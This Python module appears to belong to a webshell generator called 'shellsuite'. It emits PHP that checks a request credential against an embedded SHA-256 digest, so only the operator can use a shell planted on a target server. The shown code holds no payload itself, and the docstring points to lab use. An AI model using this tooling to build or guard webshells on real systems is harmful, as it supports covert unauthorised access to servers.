"""Authentication guard generation for authenticated webshells.

The credential is compared against a SHA-256 digest embedded in the shell, so
the plaintext password is never stored on the target. ``hash("sha256", ...)``
exists in PHP 5.1.2+, which keeps the generated PHP compatible with the lab.
"""

from __future__ import annotations

import hashlib

from shellsuite.protocol import contract

from . import readers

ALGORITHM = "sha256"


def secret_hash(secret: str) -> str:
    """SHA-256 hex digest of the password, as embedded in the webshell."""
    return hashlib.sha256(secret.encode("utf-8")).hexdigest()


def guard(vector: str, expected_hash: str) -> str:
    """Return the PHP that reads the vector's credential and sets $__ss_ok."""
    name = contract.AUTH_PARAM_NAMES.get(vector)
    if name is None:
        raise ValueError(f"no auth reader for vector: {vector!r}")
    read = readers.read(vector, "$__ss_auth", name)
    check = (
        f'$__ss_ok = ($__ss_auth !== "" && '
        f'hash("{ALGORITHM}", $__ss_auth) === "{expected_hash}");'
    )
    return read + "\n" + check
